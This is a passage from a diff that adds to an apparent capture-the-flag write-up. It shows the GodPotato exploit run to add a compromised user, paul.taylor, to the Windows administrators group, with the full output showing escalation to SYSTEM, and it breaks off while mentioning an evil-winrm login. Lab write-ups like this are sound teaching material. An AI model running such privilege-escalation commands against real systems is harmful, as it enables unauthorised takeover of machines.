@@ -782,3 +782,37 @@ Ill download it from github, then transfer it my machine using a python web serv
 
 Now all i need to do is run it!
 
+```python
+PS C:\users\alexander.green\Documents> .\godpotato.exe -cmd "cmd /c net localgroup administrators paul.taylor /add"
+[*] CombaseModule: 0x140716828131328
+[*] DispatchTable: 0x140716830722376
+[*] UseProtseqFunction: 0x140716830014272
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\85681b04-065f-4c07-bd08-9c216bafb7e2\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000b002-1464-ffff-4c01-5453e2e0a0ab
+[*] DCOM obj OXID: 0x556fb81f0db89e2
+[*] DCOM obj OID: 0xbe981b63a7f4d38d
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 936 Token:0x644  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 3548
+The command completed successfully.
+
+PS C:\users\alexander.green\Documents> 
+```
+This command added the initial user i compromise `paul.taylor` to the administrators group.
+
+Now if i login via evil-winrm i should ha
